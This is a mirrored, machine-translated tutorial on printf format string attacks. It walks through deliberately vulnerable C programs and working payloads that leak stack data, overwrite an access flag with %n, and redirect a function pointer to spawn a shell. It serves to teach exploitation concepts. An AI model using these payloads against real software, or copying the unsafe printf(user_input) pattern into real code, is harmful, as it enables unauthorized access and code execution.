<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Printf Oriented Programming</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Intro 
 To my surprise, I did not find articles on this topic and this article I would like to correct the situation. In it, I will try to tell the mo...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Printf Oriented Programming</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/8d8/b54/5fa/8d8b545fa7d245b593d3735f72f3f63f.png"><br><br><h3>  Intro </h3><br>  To my surprise, I did not find articles on this topic and this article I would like to correct the situation.  In it, I will try to tell the most intelligible of the attacker about <a href="https://en.wikipedia.org/wiki/Uncontrolled_format_string">Format String Attacks</a> , but with some simplifications.  In practice, they are quite simply resolved, but do not really want to dwell on them.  In addition, the most persistent, to the end, in addition to invaluable knowledge, is waiting for a small bonus. <br><a name="habracut"></a><br><h3>  Why is it even needed? </h3><br>  Like other vulnerabilities, you need Format String Attacks in order to gain unauthorized access to the program and do whatever you want with it.  One of the important features of this vulnerability is indifference to additional measures of protection like <abbr title="Data Execution Prevention">w ^ x</abbr> and <abbr title="Address space layout randomization">ASLR</abbr> .  And most importantly, it allows you to circumvent the relatively new <abbr title="Control-Flow Integrity">CFI</abbr> protection. <br><br><h3>  Let's start? </h3><br>  As it always seemed to me best to understand what is happening with examples, so without further words to the code immediately. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre><code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; void f(char *str) { char *secret_data = "My Awesome Key"; printf(str); } int main(int argc, char **argv) { f(argv[1]); return 0; }</span></span></span></span></code> </pre> <br><div class="spoiler">  <b class="spoiler_title">For those who forgot about printf</b> <div class="spoiler_text">  The printf () - like functions work like this: <br><br><ul><li>  Display string </li><li>  Replace special characters starting with% </li><li>  Return the number of characters successfully printed </li></ul><br></div></div><br>  What can we do about it?  Let's compile our code and run it.  Here and further we will work with x86-32. <br><br><pre> <code class="bash hljs">$ cc -m32 format_vuln.c -o format_vuln $ ./format_vuln %d 47</code> </pre><br>  I wonder where did 47 come from?  We asked to display "% d".  Actually, the function was written in C. Since operator overloading is not there, she does not know how many arguments she was given, so she orients herself to the first argument, which parses the string and with each% takes the next argument from the stack. <br><br><div class="spoiler">  <b class="spoiler_title">Where did all the 47 come from?</b> <div class="spoiler_text">  The fact is that for performance, values ‚Äã‚Äãon the stack are not reset.  The allocation / release of memory occurs by decreasing / increasing the corresponding pointer on the stack.  So 47 is just some arbitrary number of some side calculations. <br></div></div><br>  After playing a little you can get the coveted key. <br><br><pre> <code class="bash hljs">$ ./format_vuln %d.%d.%d.%d.%d.%d.%s 47.-145670960.-143695128.32768.-143929344.-143936984.My Awesome Key</code> </pre><br><h3>  Why exactly 6% d? </h3><br>  Let's look at the disassembled listing of the f function using objdump: <br><br><pre> <code class="hljs go"><span class="hljs-number"><span class="hljs-number">080483f</span></span>b &lt;f&gt;: <span class="hljs-number"><span class="hljs-number">80483f</span></span>b: <span class="hljs-number"><span class="hljs-number">55</span></span> push ebp <span class="hljs-number"><span class="hljs-number">80483f</span></span>c: <span class="hljs-number"><span class="hljs-number">89</span></span> e5 mov ebp,esp <span class="hljs-number"><span class="hljs-number">80483f</span></span>e: <span class="hljs-number"><span class="hljs-number">83</span></span> ec <span class="hljs-number"><span class="hljs-number">18</span></span> sub esp,<span class="hljs-number"><span class="hljs-number">0x18</span></span> <span class="hljs-number"><span class="hljs-number">8048401</span></span>: c7 <span class="hljs-number"><span class="hljs-number">45</span></span> f4 d0 <span class="hljs-number"><span class="hljs-number">84</span></span> <span class="hljs-number"><span class="hljs-number">04</span></span> <span class="hljs-number"><span class="hljs-number">08</span></span> mov DWORD PTR [ebp<span class="hljs-number"><span class="hljs-number">-0xc</span></span>],<span class="hljs-number"><span class="hljs-number">0x80484d</span></span>0 <span class="hljs-number"><span class="hljs-number">8048408</span></span>: <span class="hljs-number"><span class="hljs-number">83</span></span> ec <span class="hljs-number"><span class="hljs-number">0</span></span>c sub esp,<span class="hljs-number"><span class="hljs-number">0xc</span></span> <span class="hljs-number"><span class="hljs-number">804840</span></span>b: ff <span class="hljs-number"><span class="hljs-number">75</span></span> <span class="hljs-number"><span class="hljs-number">08</span></span> push DWORD PTR [ebp+<span class="hljs-number"><span class="hljs-number">0x8</span></span>] <span class="hljs-number"><span class="hljs-number">804840</span></span>e: e8 bd fe ff ff call <span class="hljs-number"><span class="hljs-number">80482d</span></span>0 &lt;printf@plt&gt; <span class="hljs-number"><span class="hljs-number">8048413</span></span>: <span class="hljs-number"><span class="hljs-number">83</span></span> c4 <span class="hljs-number"><span class="hljs-number">10</span></span> add esp,<span class="hljs-number"><span class="hljs-number">0x10</span></span> <span class="hljs-number"><span class="hljs-number">8048416</span></span>: <span class="hljs-number"><span class="hljs-number">90</span></span> nop <span class="hljs-number"><span class="hljs-number">8048417</span></span>: c9 leave <span class="hljs-number"><span class="hljs-number">8048418</span></span>: c3 ret</code> </pre><br>  At the address <b>0x80484d0,</b> our key is stored and written to the stack at <b>ebp-0xc</b> .  Our first argument is at <b>ebp + 0x8</b> . <br><br>  According to the instructions <b>sub esp, 0x **</b> allocated the right place on the stack.  And clearly stands out a lot of excess.  This alignment of the data (padding) also becomes it automatically compilers, for productivity. <br><br>  Total if you look at the stack before calling printf, then it becomes clear where these 6% d come from. <br><br><img src="https://habrastorage.org/files/513/cfa/41e/513cfa41eef54478a76bf237adf2f628.png"><br><br><h3>  Unpopular features printf </h3><br>  In addition to potential data leakage, printf has other interesting features. <br><br><ul><li>  <abbr title="POSIX extension, so without dancing on win32 should not work">Referring to the nth argument</abbr> , for example, calling printf ("% 3 $ d% 1 $ d% 2 $ d", 1, 2, 3) will display "3, 1, 2" </li><li>  Determining the length of the output argument, such as calling printf ("%. * S", 4, "Hello!") Will print "Hell" </li><li>  Writing to the passed pointer the number of successfully printed characters using% n </li></ul><br>  For example, having the following code: <br><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; int main() { int i, j; printf("Hello%2$n, world!%1$n\n", &amp;i, &amp;j); printf("%d %*d", i, 3, j); return 0; }</span></span></span></span></code> </pre><br>  we get this conclusion: <br><br><pre> <code class="bash hljs">$ cc -m32 printfwrite.c -oprintfwrite $ ./printfwrite Hello, world! 13 5</code> </pre><br>  This functionality opens up new possibilities for exploitation.  Let's change our old code a <i>bit</i> and see what we can do with it. <br><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; void f(char *str, int acc) { int *access = &amp;acc; printf(str); if (*access) { puts("Secret information revealed!"); } } int main(int argc, char **argv) { char *usr = getenv("USER"); if(usr==NULL) return EXIT_FAILURE; f(argv[1], usr == "kitsu"); return 0; }</span></span></span></span></code> </pre><br><pre> <code class="bash hljs">$ cc -m32 printfacccess.c -m32 -o printfacccess $ ./printfacccess %d.%d.%d.%d.%d.%d.%n -4922064.2.4.-4922088.-143168832.-145108519.Secret information revealed!</code> </pre><br>  But what if the number we need to write is very large?  For example, the address of the function.  The first thing that comes to mind is to submit a string of appropriate sizes.  Let's say we have a shellcode address, and also have control over printf, what do we do? <br><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; typedef void(*fptr)(); void routine() { /* do something useful */ puts("Routine done."); } void shell() { execve("/bin/bash", 0, 0); } void f(char *str, fptr p) { fptr ptr = p; printf(str); ptr(); } int main(int argc, char **argv) { f(argv[1], routine); return 0; }</span></span></span></span></code> </pre><br>  The shell address of interest after compilation is 0x80484d4.  We print an arbitrary character as many times, and then rewrite the function pointer. <br><br><pre> <code class="bash hljs">$ cc -m32 printfshell.c -oprintfshell $ ./printfshell `python -c <span class="hljs-string"><span class="hljs-string">'print("0"*0x80484d4 + "%n")'</span></span>` bash: ./printfshell: Argument list too long</code> </pre><br>  Alas, bashu this idea was not very liking.  But we can achieve a similar effect with the help of the already mentioned output width, and then write the number in the same way with% n. <br><br><pre> <code class="bash hljs">$ ./printfshell `python -c <span class="hljs-string"><span class="hljs-string">'print("%1$134513876.0X%7$n")'</span></span>` &gt;out $ <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"$$"</span></span> $ <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span> <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span> $ <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"$$"</span></span> 3899 $ tail -c 4 out 3920</code> </pre><br>  And now let's take a closer look at what miracles happened here.  Here we launched our program and launched a new instance of the shell we needed. <br><br><h4>  And what all the same "% 1 $ 134513876.0X% 7 $ n" mean? </h4><br>  It consists of two <b>executable</b> characters <b>"% 1 $ 134513876.0X"</b> and <b>"% 7 $ n"</b> . <br><br>  <b>% 1 $ 134513876.0X</b> - output to stdout of the first argument passed, with a long field of <b>134513876</b> (this is the address of our shellcode).  What is displayed does not matter, the main thing is the number of characters. <br><br>  <b>% 7 $ n</b> - writes to 7 arguments.  He writes down just the number of characters that we derived, i.e.  shellcode address <br><br><h2>  In custody </h2><br>  As you can see, the printf () - like functions have enormous power.  Moreover, absolute, because as it turned out they are still <a href="http://nebelwelt.net/publications/files/15SEC.pdf">turing-complete</a> , which means that they can potentially contain everything that a hacker would like. <br><br>  How?  This is achieved by fairly long and complex sequences with which you can play, for example <a href="https://github.com/HexHive/printbf">, here</a> .  The guys from usenix compiled the brainfuck code in the format-string sequence.  In the repository there are examples like Fibonacci numbers, 99 bottles of beer and a lot of interesting things. </div><p>Source: <a href="https://habr.com/ru/post/274329/">https://habr.com/ru/post/274329/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../274319/index.html">How to migrate to Oracle Java Cloud in 1.5 hours?</a></li>
<li><a href="../274321/index.html">We are looking for errors in MonoDevelop</a></li>
<li><a href="../274323/index.html">An example of the implementation of methods for processing and recognition of images on Android</a></li>
<li><a href="../274325/index.html">Mobile Applications and PA-DSS</a></li>
<li><a href="../274327/index.html">Useful add-ons to ReSharper</a></li>
<li><a href="../274333/index.html">How to create a convincing mechanics of death and not screw it up</a></li>
<li><a href="../274335/index.html">AI, BigData & HPC Digest # 3</a></li>
<li><a href="../274339/index.html">Network Optimization Practice Stories</a></li>
<li><a href="../274349/index.html">The subtle virtues of regular expressions in Python</a></li>
<li><a href="../274353/index.html">Tale of how I wrote my REST framework with web sockets</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>